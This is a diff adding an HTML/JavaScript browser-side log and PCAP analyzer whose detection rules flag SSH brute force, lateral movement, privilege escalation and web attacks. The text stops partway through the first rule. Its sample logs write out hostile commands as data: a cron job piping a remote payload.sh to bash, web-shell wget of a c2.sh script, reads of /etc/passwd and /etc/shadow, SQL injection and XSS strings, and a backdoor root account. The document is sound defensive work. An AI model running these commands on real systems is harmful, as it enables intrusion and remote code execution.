@@ -1,0 +1,1697 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Log Analyzer — Ghost Defense</title>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#07070e;--s1:#0e0e1a;--s2:#141728;--s3:#1c2035;
+  --border:rgba(255,255,255,0.06);--border2:rgba(255,255,255,0.12);
+  --text:#eeedf8;--muted:#6b6a84;--muted2:#9998b8;
+  --accent:#5b54ff;--accent-s:rgba(91,84,255,0.12);--accent-b:rgba(91,84,255,0.3);
+  --green:#2fd98a;--green-s:rgba(47,217,138,0.1);--green-b:rgba(47,217,138,0.28);
+  --red:#ff4d4d;--red-s:rgba(255,77,77,0.1);--red-b:rgba(255,77,77,0.3);
+  --orange:#ff8c42;--orange-s:rgba(255,140,66,0.1);--orange-b:rgba(255,140,66,0.28);
+  --yellow:#ffd166;--yellow-s:rgba(255,209,102,0.1);--yellow-b:rgba(255,209,102,0.25);
+  --blue:#4cc9f0;--blue-s:rgba(76,201,240,0.1);--blue-b:rgba(76,201,240,0.28);
+  --purple:#b48eff;--purple-s:rgba(180,142,255,0.1);--purple-b:rgba(180,142,255,0.28);
+  --mono:'IBM Plex Mono',monospace;--sans:'IBM Plex Sans',sans-serif;
+}
+html{background:var(--bg)}
+body{font-family:var(--sans);color:var(--text);min-height:100vh;display:flex;flex-direction:column}
+
+/* TOPBAR */
+.topbar{background:var(--s1);border-bottom:1px solid var(--border);padding:13px 24px;
+  display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
+.brand{display:flex;align-items:center;gap:10px}
+.brand-icon{width:30px;height:30px;background:var(--yellow-s);border:1px solid var(--yellow-b);
+  border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:15px}
+.brand-name{font-size:15px;font-weight:600;letter-spacing:-.01em}
+.brand-sub{font-size:11px;color:var(--muted);font-family:var(--mono)}
+.privacy-badge{font-family:var(--mono);font-size:10px;color:var(--green);
+  background:var(--green-s);border:1px solid var(--green-b);padding:4px 10px;border-radius:4px}
+
+/* LAYOUT */
+.layout{display:grid;grid-template-columns:420px 1fr;flex:1;height:calc(100vh - 57px)}
+
+/* INPUT PANEL */
+.input-panel{border-right:1px solid var(--border);display:flex;flex-direction:column;
+  overflow:hidden;background:var(--bg)}
+.panel-tabs{display:flex;border-bottom:1px solid var(--border);background:var(--s1)}
+.ptab{flex:1;padding:10px 6px;font-size:11px;font-family:var(--mono);color:var(--muted);
+  cursor:pointer;border:none;background:transparent;border-bottom:2px solid transparent;
+  margin-bottom:-1px;transition:all .15s;text-align:center}
+.ptab.active{color:var(--yellow);border-bottom-color:var(--yellow)}
+.ptab:hover:not(.active){color:var(--text)}
+.panel-body{flex:1;display:flex;flex-direction:column;padding:14px;gap:10px;overflow-y:auto}
+
+/* LOG INPUT */
+.log-area{flex:1;min-height:280px;background:var(--s2);border:1px solid var(--border2);
+  border-radius:10px;color:var(--text);font-family:var(--mono);font-size:11px;
+  line-height:1.7;padding:12px 14px;resize:none;outline:none;transition:border-color .15s}
+.log-area:focus{border-color:var(--yellow-b)}
+.log-area::placeholder{color:var(--muted)}
+
+/* UPLOAD */
+.upload-label{display:flex;align-items:center;gap:7px;background:var(--s2);
+  border:1px dashed var(--border2);border-radius:8px;padding:9px 12px;cursor:pointer;
+  transition:all .15s;color:var(--muted2);font-size:12px}
+.upload-label:hover{border-color:var(--yellow-b);color:var(--yellow)}
+.upload-label svg{width:13px;height:13px;flex-shrink:0}
+.upload-label input{position:absolute;width:1px;height:1px;opacity:0;pointer-events:none}
+
+/* OPTIONS */
+.options-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.opt-cell{background:var(--s2);border:1px solid var(--border);border-radius:7px;padding:9px 11px}
+.opt-label{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em;margin-bottom:5px}
+.opt-select{width:100%;background:transparent;border:none;color:var(--text);
+  font-family:var(--mono);font-size:11px;outline:none;cursor:pointer}
+.opt-select option{background:var(--s2)}
+
+/* HINTS */
+.hint-box{background:var(--s2);border:1px solid var(--border);border-radius:7px;
+  padding:10px 12px;font-size:11px;color:var(--muted2);line-height:1.7;font-family:var(--mono)}
+
+/* ANALYZE BTN */
+.analyze-btn{background:var(--yellow);border:none;border-radius:9px;color:#1a1200;
+  font-family:var(--sans);font-size:14px;font-weight:700;padding:12px;cursor:pointer;
+  transition:all .15s;width:100%;letter-spacing:.02em}
+.analyze-btn:hover{background:#ffe066}
+.analyze-btn:active{transform:scale(.98)}
+.analyze-btn:disabled{opacity:.4;cursor:default;transform:none}
+
+/* RESULTS PANEL */
+.results-panel{overflow-y:auto;background:var(--bg);display:flex;flex-direction:column}
+.empty-state{display:flex;flex-direction:column;align-items:center;justify-content:center;
+  flex:1;gap:12px;color:var(--muted);text-align:center;padding:40px}
+.empty-state svg{width:52px;height:52px;opacity:.1;stroke:var(--yellow)}
+.empty-state h3{font-size:15px;font-weight:400;color:var(--muted2)}
+
+/* VERDICT */
+.verdict-banner{padding:18px 24px;display:flex;align-items:center;gap:14px;
+  border-bottom:1px solid var(--border)}
+.verdict-icon{font-size:28px;flex-shrink:0}
+.verdict-label{font-size:20px;font-weight:700;letter-spacing:-.02em}
+.verdict-sub{font-size:12px;color:var(--muted2);margin-top:4px;font-family:var(--mono)}
+
+/* RISK METER */
+.risk-meter{display:flex;align-items:center;gap:12px;padding:12px 24px;
+  border-bottom:1px solid var(--border)}
+.risk-track{flex:1;height:7px;background:var(--s3);border-radius:4px;overflow:hidden}
+.risk-fill{height:100%;border-radius:4px;transition:width .7s cubic-bezier(.4,0,.2,1)}
+.risk-pct{font-family:var(--mono);font-size:12px;font-weight:600;min-width:80px;text-align:right}
+
+/* SUMMARY */
+.summary-bar{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));
+  gap:10px;padding:14px 24px;border-bottom:1px solid var(--border)}
+.sum-card{background:var(--s2);border:1px solid var(--border);border-radius:8px;padding:11px;text-align:center}
+.sum-num{font-family:var(--mono);font-size:20px;font-weight:500;margin-bottom:3px}
+.sum-lbl{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em}
+
+/* TOOLBAR */
+.toolbar{display:flex;align-items:center;gap:7px;padding:10px 24px;
+  border-bottom:1px solid var(--border);flex-wrap:wrap}
+.filter-chip{font-size:11px;font-family:var(--mono);padding:4px 10px;border-radius:5px;
+  background:var(--s2);border:1px solid var(--border2);color:var(--muted2);cursor:pointer;transition:all .12s}
+.filter-chip.active{background:var(--yellow-s);color:var(--yellow);border-color:var(--yellow-b)}
+.spacer{flex:1}
+.exp-btn{display:flex;align-items:center;gap:5px;font-size:12px;font-family:var(--sans);
+  font-weight:600;padding:6px 12px;border-radius:7px;cursor:pointer;transition:all .15s;border:1px solid}
+.exp-csv{background:var(--green-s);color:var(--green);border-color:var(--green-b)}
+.exp-html{background:var(--accent-s);color:#a09bff;border-color:var(--accent-b)}
+.exp-pdf{background:var(--red-s);color:var(--red);border-color:var(--red-b)}
+.exp-btn svg{width:12px;height:12px}
+
+/* FINDINGS */
+.findings-wrap{padding:16px 24px;display:flex;flex-direction:column;gap:10px}
+.finding-card{background:var(--s1);border:1px solid var(--border);border-radius:10px;overflow:hidden}
+.finding-card.critical{border-color:var(--red-b)}
+.finding-card.high{border-color:var(--orange-b)}
+.finding-card.medium{border-color:var(--yellow-b)}
+.finding-card.low{border-color:var(--blue-b)}
+.finding-card.info{border-color:var(--border2)}
+.finding-hdr{display:flex;align-items:center;gap:10px;padding:11px 14px;cursor:pointer;
+  user-select:none;transition:background .12s}
+.finding-hdr:hover{background:var(--s2)}
+.finding-sev{font-size:10px;font-family:var(--mono);font-weight:700;padding:2px 8px;
+  border-radius:4px;white-space:nowrap;flex-shrink:0}
+.sev-critical{background:var(--red-s);color:var(--red);border:1px solid var(--red-b)}
+.sev-high{background:var(--orange-s);color:var(--orange);border:1px solid var(--orange-b)}
+.sev-medium{background:var(--yellow-s);color:var(--yellow);border:1px solid var(--yellow-b)}
+.sev-low{background:var(--blue-s);color:var(--blue);border:1px solid var(--blue-b)}
+.sev-info{background:var(--s3);color:var(--muted2);border:1px solid var(--border2)}
+.finding-title{font-size:13px;font-weight:600;flex:1}
+.finding-count{font-family:var(--mono);font-size:11px;color:var(--muted2);
+  background:var(--s2);border:1px solid var(--border);padding:2px 8px;border-radius:4px}
+.finding-arr{color:var(--muted);font-size:11px}
+.finding-body{display:none;border-top:1px solid var(--border)}
+.finding-body.open{display:block}
+
+/* EVIDENCE LINES */
+.evidence-wrap{max-height:320px;overflow-y:auto;font-family:var(--mono);font-size:11px}
+.evidence-line{display:flex;align-items:flex-start;gap:0;border-bottom:1px solid var(--border)}
+.evidence-line:last-child{border-bottom:none}
+.ev-num{color:var(--muted);padding:6px 8px;min-width:52px;text-align:right;
+  flex-shrink:0;border-right:1px solid var(--border);font-size:10px;user-select:none}
+.ev-text{padding:6px 10px;color:var(--text);word-break:break-all;line-height:1.5;flex:1}
+.ev-text mark{background:rgba(255,209,102,.2);color:var(--yellow);border-radius:2px;padding:0 2px}
+.ev-text mark.red{background:rgba(255,77,77,.15);color:var(--red)}
+.ev-text mark.orange{background:rgba(255,140,66,.15);color:var(--orange)}
+.ev-text mark.blue{background:rgba(76,201,240,.15);color:var(--blue)}
+
+/* MITRE TAG */
+.mitre-tag{font-size:10px;font-family:var(--mono);background:var(--accent-s);color:#a09bff;
+  border:1px solid var(--accent-b);padding:2px 7px;border-radius:4px;margin-right:4px;white-space:nowrap}
+.detail-row{display:flex;justify-content:space-between;gap:8px;padding:7px 14px;
+  border-bottom:1px solid var(--border);font-size:12px}
+.detail-row:last-child{border-bottom:none}
+.dl{color:var(--muted2)}.dv{font-family:var(--mono);color:var(--text);text-align:right;word-break:break-all}
+
+/* SPINNER */
+.spinner{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.1);
+  border-top-color:var(--yellow);border-radius:50%;animation:spin .7s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+.fade-in{animation:fadeIn .25s ease both}
+::-webkit-scrollbar{width:5px;height:5px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--s3);border-radius:3px}
+@media(max-width:860px){
+  .layout{grid-template-columns:1fr;height:auto}
+  .input-panel{border-right:none;border-bottom:1px solid var(--border);max-height:none}
+  .results-panel{min-height:60vh}
+}
+
+/* PCAP */
+.pcap-summary{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:8px;margin-bottom:14px}
+.pcap-stat{background:var(--s2);border:1px solid var(--border);border-radius:7px;padding:10px 12px;text-align:center}
+.pcap-stat-num{font-family:var(--mono);font-size:20px;font-weight:600;margin-bottom:3px}
+.pcap-stat-lbl{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.08em}
+.pcap-flow{background:var(--s1);border:1px solid var(--border);border-radius:8px;overflow:hidden;margin-bottom:10px}
+.pcap-flow-hdr{display:flex;align-items:center;gap:10px;padding:10px 13px;cursor:pointer;transition:background .12s;font-family:var(--mono);font-size:11px}
+.pcap-flow-hdr:hover{background:var(--s2)}
+.pcap-flow-body{display:none;border-top:1px solid var(--border);padding:12px 14px;font-family:var(--mono);font-size:11px;color:var(--muted2);line-height:1.7}
+.pcap-flow-body.open{display:block}
+.pcap-badge{font-size:9px;padding:2px 7px;border-radius:3px;font-weight:700;font-family:var(--mono)}
+.pcap-drop{border:2px dashed var(--border2);border-radius:10px;padding:40px;text-align:center;
+  cursor:pointer;transition:all .15s;color:var(--muted)}
+.pcap-drop:hover,.pcap-drop.drag{border-color:var(--yellow-b);color:var(--yellow)}
+.pcap-drop-icon{font-size:36px;margin-bottom:10px}
+.pcap-proto{font-size:10px;padding:1px 6px;border-radius:3px;font-family:var(--mono);font-weight:700}
+.proto-tcp{background:rgba(76,201,240,.15);color:var(--blue);border:1px solid var(--blue-b)}
+.proto-udp{background:rgba(47,217,138,.15);color:var(--green);border:1px solid var(--green-b)}
+.proto-dns{background:rgba(180,142,255,.15);color:var(--purple);border:1px solid var(--purple-b)}
+.proto-http{background:rgba(255,140,66,.15);color:var(--orange);border:1px solid var(--orange-b)}
+.proto-icmp{background:rgba(255,209,102,.15);color:var(--yellow);border:1px solid var(--yellow-b)}
+.proto-tls{background:rgba(47,217,138,.15);color:var(--green);border:1px solid var(--green-b)}
+.proto-other{background:var(--s3);color:var(--muted2);border:1px solid var(--border)}
+
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="brand">
+    <div class="brand-icon">🔍</div>
+    <div>
+      <div class="brand-name">Log Analyzer</div>
+      <div class="brand-sub">Ghost Defense · Tool 24</div>
+    </div>
+  </div>
+  <span class="privacy-badge">LOCAL PROCESSING · LOGS NEVER LEAVE YOUR BROWSER</span>
+</div>
+
+<div class="layout">
+
+  <!-- INPUT PANEL -->
+  <div class="input-panel">
+    <div class="panel-tabs">
+      <button class="ptab active" id="tab-paste" onclick="switchTab('paste')">PASTE LOGS</button>
+      <button class="ptab" id="tab-file" onclick="switchTab('file')">UPLOAD FILE</button>
+      <button class="ptab" id="tab-sample" onclick="switchTab('sample')">SAMPLES</button>
+      <button class="ptab" id="tab-pcap" onclick="switchTab('pcap')">📦 PCAP</button>
+    </div>
+
+    <!-- PASTE TAB -->
+    <div class="panel-body" id="panel-paste">
+      <div class="hint-box">Supports: syslog · auth.log · Windows Event XML/text · Apache/nginx access.log · SSH logs · sudo logs · PowerShell logs</div>
+      <textarea class="log-area" id="logInput" placeholder="Paste log content here...
+
+Examples:
+Jun 10 03:22:41 server sshd[1234]: Failed password for root from 192.168.1.100 port 54321 ssh2
+Jun 10 03:22:42 server sshd[1234]: Failed password for root from 192.168.1.100 port 54322 ssh2
+Jun 10 03:22:43 server sshd[1234]: Accepted password for admin from 10.0.0.5 port 22 ssh2
+Jun 10 04:01:12 server sudo: www-data : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash"></textarea>
+      <button class="analyze-btn" onclick="analyze()">🔍 ANALYZE LOGS</button>
+    </div>
+
+    <!-- FILE TAB -->
+    <div class="panel-body" id="panel-file" style="display:none">
+      <div class="hint-box">Upload any plain text log file — .log, .txt, .csv, Windows EVTX export, or syslog. Processed entirely in your browser.</div>
+      <label class="upload-label" style="flex:1;flex-direction:column;justify-content:center;min-height:120px;text-align:center">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:28px;height:28px;margin-bottom:8px;opacity:.5">
+          <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+          <polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/>
+        </svg>
+        <span id="fileName">Drop log file or click to browse</span>
+        <span style="font-size:10px;color:var(--muted);margin-top:4px">.log · .txt · .csv · .xml</span>
+        <input type="file" accept=".log,.txt,.csv,.xml,.evtx" onclick="this.value=null" onchange="loadFile(event)">
+      </label>
+      <button class="analyze-btn" id="fileAnalyzeBtn" onclick="analyze()" disabled>🔍 ANALYZE LOGS</button>
+    </div>
+
+    <!-- SAMPLES TAB -->
+    <div class="panel-body" id="panel-sample" style="display:none">
+      <div class="hint-box">Click a sample to load it and analyze.</div>
+      <div style="display:flex;flex-direction:column;gap:8px">
+        <button onclick="loadSample('brute')" style="background:var(--s2);border:1px solid var(--red-b);border-radius:8px;color:var(--text);font-family:var(--sans);font-size:12px;padding:10px 14px;cursor:pointer;text-align:left;transition:background .12s" onmouseover="this.style.background='var(--s3)'" onmouseout="this.style.background='var(--s2)'">
+          <div style="font-weight:600;color:var(--red);margin-bottom:3px">⚡ SSH Brute Force Attack</div>
+          <div style="color:var(--muted);font-size:11px">Repeated failed logins from single IP, then success</div>
+        </button>
+        <button onclick="loadSample('lateral')" style="background:var(--s2);border:1px solid var(--orange-b);border-radius:8px;color:var(--text);font-family:var(--sans);font-size:12px;padding:10px 14px;cursor:pointer;text-align:left;transition:background .12s" onmouseover="this.style.background='var(--s3)'" onmouseout="this.style.background='var(--s2)'">
+          <div style="font-weight:600;color:var(--orange);margin-bottom:3px">🔀 Lateral Movement</div>
+          <div style="color:var(--muted);font-size:11px">Logins spreading across multiple internal hosts</div>
+        </button>
+        <button onclick="loadSample('privesc')" style="background:var(--s2);border:1px solid var(--yellow-b);border-radius:8px;color:var(--text);font-family:var(--sans);font-size:12px;padding:10px 14px;cursor:pointer;text-align:left;transition:background .12s" onmouseover="this.style.background='var(--s3)'" onmouseout="this.style.background='var(--s2)'">
+          <div style="font-weight:600;color:var(--yellow);margin-bottom:3px">⬆️ Privilege Escalation</div>
+          <div style="color:var(--muted);font-size:11px">Unusual sudo usage and root shell spawning</div>
+        </button>
+        <button onclick="loadSample('windows')" style="background:var(--s2);border:1px solid var(--blue-b);border-radius:8px;color:var(--text);font-family:var(--sans);font-size:12px;padding:10px 14px;cursor:pointer;text-align:left;transition:background .12s" onmouseover="this.style.background='var(--s3)'" onmouseout="this.style.background='var(--s2)'">
+          <div style="font-weight:600;color:var(--blue);margin-bottom:3px">🪟 Windows Event Logs</div>
+          <div style="color:var(--muted);font-size:11px">Event IDs 4625, 4648, 4672 — account anomalies</div>
+        </button>
+        <button onclick="loadSample('webattack')" style="background:var(--s2);border:1px solid var(--purple-b);border-radius:8px;color:var(--text);font-family:var(--sans);font-size:12px;padding:10px 14px;cursor:pointer;text-align:left;transition:background .12s" onmouseover="this.style.background='var(--s3)'" onmouseout="this.style.background='var(--s2)'">
+          <div style="font-weight:600;color:var(--purple);margin-bottom:3px">🌐 Web Attack Patterns</div>
+          <div style="color:var(--muted);font-size:11px">SQLi, XSS, path traversal in access logs</div>
+        </button>
+      </div>
+      <button class="analyze-btn" id="sampleAnalyzeBtn" onclick="analyze()" disabled>🔍 ANALYZE LOGS</button>
+    </div>
+
+    <div class="panel-body" id="panel-pcap" style="display:none">
+      <div class="hint-box">Upload a packet capture — <b>.pcap</b>, <b>.pcapng</b>, or <b>.cap</b>. Parsed entirely in your browser (binary read, no server). Extracts flows, protocols, talkers, ports, DNS, and plaintext indicators.</div>
+      <label class="pcap-drop" id="pcapDrop" style="cursor:pointer;display:flex;flex-direction:column;align-items:center;justify-content:center">
+        <div class="pcap-drop-icon">📦</div>
+        <div style="font-weight:600;color:var(--text)">Drop a PCAP here, or click to browse</div>
+        <div style="font-size:10px;color:var(--muted);margin-top:6px">.pcap · .pcapng · .cap — processed locally in your browser</div>
+        <input type="file" accept=".pcap,.pcapng,.cap" style="position:absolute;width:1px;height:1px;opacity:0;pointer-events:none" onclick="this.value=null" onchange="if(event.target.files[0])handlePcapFile(event.target.files[0])">
+      </label>
+      <div id="pcapResults" style="margin-top:14px"></div>
+    </div>
+
+    <!-- OPTIONS -->
+    <div style="padding:12px 14px;border-top:1px solid var(--border)">
+      <div style="font-size:10px;text-transform:uppercase;letter-spacing:.12em;color:var(--muted);font-family:var(--mono);margin-bottom:8px">Detection Options</div>
+      <div class="options-grid">
+        <div class="opt-cell"><div class="opt-label">Log Format</div>
+          <select class="opt-select" id="logFormat">
+            <option value="auto">Auto-detect</option>
+            <option value="syslog">Syslog / auth.log</option>
+            <option value="windows">Windows Event</option>
+            <option value="apache">Apache / nginx</option>
+            <option value="ssh">SSH logs</option>
+            <option value="raw">Raw text</option>
+          </select></div>
+        <div class="opt-cell"><div class="opt-label">Sensitivity</div>
+          <select class="opt-select" id="sensitivity">
+            <option value="high">High (all alerts)</option>
+            <option value="medium" selected>Medium (recommended)</option>
+            <option value="low">Low (critical only)</option>
+          </select></div>
+        <div class="opt-cell"><div class="opt-label">Brute Threshold</div>
+          <select class="opt-select" id="bruteThresh">
+            <option value="3">3 failures</option>
+            <option value="5" selected>5 failures</option>
+            <option value="10">10 failures</option>
+            <option value="20">20 failures</option>
+          </select></div>
+        <div class="opt-cell"><div class="opt-label">Time Window</div>
+          <select class="opt-select" id="timeWindow">
+            <option value="60">1 minute</option>
+            <option value="300" selected>5 minutes</option>
+            <option value="900">15 minutes</option>
+            <option value="3600">1 hour</option>
+          </select></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- RESULTS PANEL -->
+  <div class="results-panel" id="resultsPanel">
+    <div class="empty-state" id="emptyState">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
+        <polyline points="14 2 14 8 20 8"/>
+        <line x1="16" y1="13" x2="8" y2="13"/>
+        <line x1="16" y1="17" x2="8" y2="17"/>
+        <polyline points="10 9 9 9 8 9"/>
+      </svg>
+      <h3>Paste or upload logs to analyze</h3>
+      <p style="font-size:12px;line-height:1.7;max-width:320px">Detects brute force, lateral movement, privilege escalation, web attacks, suspicious processes, and more. All processing happens locally — logs never leave your browser.</p>
+    </div>
+  </div>
+</div>
+
+<script>
+// ── SAMPLE LOG DATA ───────────────────────────────────────────────────────────
+var SAMPLES = {
+  brute: `Jun 10 03:22:31 webserver sshd[1823]: Failed password for root from 45.33.32.156 port 43821 ssh2
+Jun 10 03:22:33 webserver sshd[1823]: Failed password for root from 45.33.32.156 port 43822 ssh2
+Jun 10 03:22:35 webserver sshd[1823]: Failed password for root from 45.33.32.156 port 43823 ssh2
+Jun 10 03:22:37 webserver sshd[1823]: Failed password for admin from 45.33.32.156 port 43824 ssh2
+Jun 10 03:22:39 webserver sshd[1823]: Failed password for admin from 45.33.32.156 port 43825 ssh2
+Jun 10 03:22:41 webserver sshd[1823]: Failed password for ubuntu from 45.33.32.156 port 43826 ssh2
+Jun 10 03:22:43 webserver sshd[1823]: Failed password for ubuntu from 45.33.32.156 port 43827 ssh2
+Jun 10 03:22:45 webserver sshd[1823]: Failed password for ubuntu from 45.33.32.156 port 43828 ssh2
+Jun 10 03:22:47 webserver sshd[1823]: Accepted password for ubuntu from 45.33.32.156 port 43829 ssh2
+Jun 10 03:22:47 webserver sshd[1823]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+Jun 10 03:23:01 webserver sudo: ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash
+Jun 10 03:23:01 webserver sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=1000)
+Jun 10 03:23:15 webserver sshd[2201]: Received disconnect from 45.33.32.156 port 43829:11`,
+
+  lateral: `2024-06-10T08:12:01 10.0.0.5 sshd[3421]: Accepted publickey for svcaccount from 10.0.0.20 port 52341 ssh2
+2024-06-10T08:12:45 10.0.0.6 sshd[3422]: Accepted publickey for svcaccount from 10.0.0.5 port 52342 ssh2
+2024-06-10T08:13:12 10.0.0.7 sshd[3423]: Accepted publickey for svcaccount from 10.0.0.5 port 52343 ssh2
+2024-06-10T08:13:45 10.0.0.8 sshd[3424]: Accepted publickey for svcaccount from 10.0.0.5 port 52344 ssh2
+2024-06-10T08:14:01 10.0.0.9 sshd[3425]: Accepted publickey for svcaccount from 10.0.0.6 port 52345 ssh2
+2024-06-10T08:14:22 10.0.0.10 sshd[3426]: Accepted publickey for svcaccount from 10.0.0.6 port 52346 ssh2
+2024-06-10T08:14:45 10.0.0.11 sshd[3427]: Accepted publickey for svcaccount from 10.0.0.7 port 52347 ssh2
+2024-06-10T08:15:01 10.0.0.20 sshd[3428]: Accepted publickey for svcaccount from 10.0.0.11 port 52348 ssh2
+2024-06-10T08:15:22 10.0.0.20 sudo: svcaccount : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -i`,
+
+  privesc: `Jun 10 09:15:01 prod-server sudo: www-data : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash
+Jun 10 09:15:01 prod-server sudo: pam_unix(sudo:session): session opened for user root by (uid=33)
+Jun 10 09:15:03 prod-server su[4521]: Successful su for root by www-data
+Jun 10 09:15:04 prod-server kernel: [UFW BLOCK] IN=eth0 OUT= SRC=10.0.0.5 DST=192.168.1.1
+Jun 10 09:15:10 prod-server sshd[4522]: Accepted password for root from 10.0.0.5 port 22 ssh2
+Jun 10 09:15:15 prod-server useradd[4530]: new user: name=backdoor, UID=0, GID=0, home=/root, shell=/bin/bash
+Jun 10 09:15:20 prod-server usermod[4531]: usermod -aG sudo backdoor
+Jun 10 09:15:25 prod-server crontab[4532]: (root) BEGIN EDIT (root)
+Jun 10 09:15:30 prod-server passwd[4533]: password changed for backdoor
+Jun 10 09:16:01 prod-server CRON[4540]: (root) CMD (curl http://45.33.32.156/payload.sh | bash)`,
+
+  windows: `2024-06-10 03:22:41 Security  4625 An account failed to log on. Account Name: Administrator Source Network Address: 185.220.101.45
+2024-06-10 03:22:42 Security  4625 An account failed to log on. Account Name: Administrator Source Network Address: 185.220.101.45
+2024-06-10 03:22:43 Security  4625 An account failed to log on. Account Name: Administrator Source Network Address: 185.220.101.45
+2024-06-10 03:22:44 Security  4625 An account failed to log on. Account Name: Administrator Source Network Address: 185.220.101.45
+2024-06-10 03:22:45 Security  4625 An account failed to log on. Account Name: Administrator Source Network Address: 185.220.101.45
+2024-06-10 03:22:46 Security  4624 An account was successfully logged on. Account Name: Administrator Source Network Address: 185.220.101.45 Logon Type: 10
+2024-06-10 03:23:01 Security  4648 A logon was attempted using explicit credentials. Account Name: svc-backup Target Server: DC01
+2024-06-10 03:23:15 Security  4672 Special privileges assigned to new logon. Account Name: svc-backup Privileges: SeDebugPrivilege SeImpersonatePrivilege
+2024-06-10 03:23:22 Security  4720 A user account was created. New Account Name: support2024
+2024-06-10 03:23:45 Security  4728 A member was added to a security-enabled global group. Group Name: Domain Admins Member Name: support2024
+2024-06-10 03:24:01 Security  7045 A new service was installed. Service Name: WindowsUpdate2 Service File Name: C:\\Windows\\Temp\\svchost.exe`,
+
+  webattack: `192.168.1.100 - - [10/Jun/2024:14:22:01 +0000] "GET /index.php?id=1' OR '1'='1 HTTP/1.1" 200 4523
+192.168.1.100 - - [10/Jun/2024:14:22:02 +0000] "GET /index.php?id=1 UNION SELECT 1,2,3,table_name FROM information_schema.tables-- HTTP/1.1" 200 1234
+192.168.1.100 - - [10/Jun/2024:14:22:03 +0000] "GET /admin/../../etc/passwd HTTP/1.1" 403 287
+192.168.1.100 - - [10/Jun/2024:14:22:04 +0000] "GET /index.php?file=../../../../etc/shadow HTTP/1.1" 200 892
+10.0.0.55 - - [10/Jun/2024:14:22:10 +0000] "POST /search?q=<scr"+"ipt>alert(document.cookie)</scr"+"ipt> HTTP/1.1" 200 3421
+10.0.0.55 - - [10/Jun/2024:14:22:11 +0000] "GET /wp-admin/admin-ajax.php?action=../../wp-config.php HTTP/1.1" 200 234
+172.16.0.10 - - [10/Jun/2024:14:22:20 +0000] "GET /shell.php?cmd=id HTTP/1.1" 200 45
+172.16.0.10 - - [10/Jun/2024:14:22:21 +0000] "GET /shell.php?cmd=cat%20/etc/passwd HTTP/1.1" 200 1823
+172.16.0.10 - - [10/Jun/2024:14:22:22 +0000] "GET /shell.php?cmd=wget%20http://45.33.32.156/c2.sh HTTP/1.1" 200 12`
+};
+
+// ── STATE ─────────────────────────────────────────────────────────────────────
+var activeTab = 'paste';
+var logContent = '';
+var analysisResults = null;
+var activeFilter = 'all';
+
+// ── TAB / FILE HANDLING ───────────────────────────────────────────────────────
+function switchTab(tab) {
+  activeTab = tab;
+  ['paste','file','sample','pcap'].forEach(function(t) {
+    var tb=document.getElementById('tab-'+t), pn=document.getElementById('panel-'+t);
+    if(tb) tb.classList.toggle('active', t===tab);
+    if(pn) pn.style.display = t===tab ? 'flex' : 'none';
+  });
+}
+
+function loadFile(evt) {
+  var file = evt.target.files[0];
+  if (!file) return;
+  var reader = new FileReader();
+  reader.onload = function(e) {
+    evt.target.value = '';
+    logContent = e.target.result;
+    document.getElementById('fileName').textContent = file.name + ' (' + Math.round(file.size/1024) + ' KB loaded)';
+    document.getElementById('fileAnalyzeBtn').disabled = false;
+  };
+  reader.onerror = function() { alert('Could not read file.'); };
+  reader.readAsText(file);
+}
+
+function loadSample(name) {
+  logContent = SAMPLES[name];
+  document.getElementById('sampleAnalyzeBtn').disabled = false;
+  // Briefly highlight which was selected
+  document.querySelectorAll('#panel-sample button[onclick^="loadSample"]').forEach(function(b){
+    b.style.borderWidth = '1px';
+  });
+  event.currentTarget.style.borderWidth = '2px';
+}
+
+function getLogContent() {
+  if (activeTab === 'paste')  return document.getElementById('logInput').value.trim();
+  if (activeTab === 'file')   return logContent;
+  if (activeTab === 'sample') return logContent;
+  return '';
+}
+
+// ── DETECTION RULES ───────────────────────────────────────────────────────────
+var RULES = [
+
+  // ── BRUTE FORCE ─────────────────────────────────────────────────────────────
+  {
+    id: 'ssh_brute',
+    title: 'SSH Brute Force Attack',
+    severity: 'critical',
+    category: 'Brute Force',
+    mitre: ['T1110.001','T1110.003'],
+    description: 'Multiple failed SSH authentication attempts from the same source IP within a short window.',
+    pattern: /Failed password for .+ from ([\d\.]+)/gi,
+    detect: function(lines, opts) {
+      var fails = {};
+      var hits = [];
+      lines.forEach(function(line, idx) {
+        var m = line.match(/Failed password for (.+?) from ([\d\.a-f:]+)/i);
+        if (m) {
+          var ip = m[2];
+          if (!fails[ip]) fails[ip] = [];
+          fails[ip].push({ line: line, idx: idx, user: m[1] });
+        }
